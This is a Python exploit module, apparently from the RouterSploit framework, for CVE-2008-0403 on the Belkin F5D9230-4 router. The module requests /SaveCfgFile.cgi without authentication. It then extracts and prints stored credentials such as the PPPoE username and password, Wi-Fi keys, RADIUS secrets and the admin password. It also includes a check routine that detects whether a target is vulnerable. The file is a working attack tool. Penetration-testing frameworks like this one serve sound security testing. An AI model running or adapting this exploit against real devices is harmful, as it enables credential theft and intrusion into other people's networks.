import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Belkin G Info Disclosure",
        "description": "Module exploits Belkin Wireless G Plus MIMO Router F5D9230-4 information disclosure "
                       "vulnerability which allows fetching sensitive information such as credentials.",
        "authors": (
            "DarkFig",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0403",
            "https://www.exploit-db.com/exploits/4941/",
        ),
        "devices": (
            "Belkin G",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/SaveCfgFile.cgi",
        )
        if response is None:
            return

        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        data = []
        for v in var:
            regexp = '{}="(.+?)"'.format(v)

            val = re.findall(regexp, response.text)
            if len(val):
                data.append((v, val[0]))

        if len(data):
            print_success("Exploit success")
            headers = ("Option", "Value")
            print_table(headers, *data)

        else:
            print_error("Exploit failed")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/SaveCfgFile.cgi",
        )
        if response is None:
            return False  # target is not vulnerable

        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        if any(map(lambda x: x in response.text, var)):
            return True   # target vulnerable

        return False  # target is not vulnerable
